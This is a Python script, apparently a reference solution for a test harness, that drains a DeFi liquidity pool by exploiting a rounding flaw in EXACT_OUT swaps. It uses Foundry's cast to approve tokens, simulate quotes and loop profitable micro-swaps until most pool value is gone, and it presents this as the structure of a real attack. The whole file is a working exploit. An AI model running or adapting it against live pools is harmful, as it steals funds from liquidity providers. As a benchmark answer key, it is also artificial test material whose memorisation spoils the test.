#!/usr/bin/env python3
"""Reference exploit — must drain the pool to the player (harness exit test).

The pool upscales with mulDown, so at its low balances an EXACT_OUT swap
under-charges. We greedily search, each step, over both directions and small
output amounts for the swap that nets the most true value (out*rate - in*rate),
execute it, and repeat until the pool's value is essentially gone. This is the
off-chain-simulation + micro-swap-loop structure of the real attack.
"""
import json
import subprocess
import sys
from pathlib import Path

ONE = 10**18


def cast(*args):
    p = subprocess.run(["cast", *args], capture_output=True, text=True, timeout=120)
    return p.stdout.strip().split()[0] if p.returncode == 0 else None


def main():
    p = json.loads(Path("params.json").read_text())
    rpc, pool = p["rpc_url"], p["pool"]
    key = Path(p["key_file"]).read_text().strip()

    fX = int(cast("call", "--rpc-url", rpc, pool, "fX()(uint256)"))
    fY = int(cast("call", "--rpc-url", rpc, pool, "fY()(uint256)"))
    init_true = int(cast("call", "--rpc-url", rpc, pool, "trueValue()(uint256)"))

    # approve the pool to pull both tokens
    maxu = cast("max-uint")
    for tok in (p["tokenX"], p["tokenY"]):
        subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key,
                        tok, "approve(address,uint256)", pool, maxu],
                       capture_output=True, text=True)

    def sim(out_is_y, amt):
        # view quote: returns (inAmt, ok). None if it can't be executed.
        r = subprocess.run(["cast", "call", "--rpc-url", rpc, pool,
                            "quoteExactOut(bool,uint256)(uint256,bool)",
                            "true" if out_is_y else "false", str(amt)],
                           capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            return None
        parts = r.stdout.split()
        in_amt = int(parts[0])
        ok = parts[1] == "true"
        if not ok or in_amt == 0:
            return None
        got = amt * (fY if out_is_y else fX)
        paid = in_amt * (fX if out_is_y else fY)
        return got - paid

    for _ in range(200):
        cur = int(cast("call", "--rpc-url", rpc, pool, "trueValue()(uint256)"))
        if cur <= init_true // 5:
            break
        best = None
        for out_is_y in (True, False):
            for amt in range(1, 13):
                g = sim(out_is_y, amt)
                if g is not None and g > 0 and (best is None or g > best[0]):
                    best = (g, out_is_y, amt)
        if best is None:
            break
        _, out_is_y, amt = best
        subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, pool,
                        "swapExactOut(bool,uint256)", "true" if out_is_y else "false", str(amt)],
                       capture_output=True, text=True)

    final = int(cast("call", "--rpc-url", rpc, pool, "trueValue()(uint256)"))
    print(f"drained pool value {init_true} -> {final}")


if __name__ == "__main__":
    main()
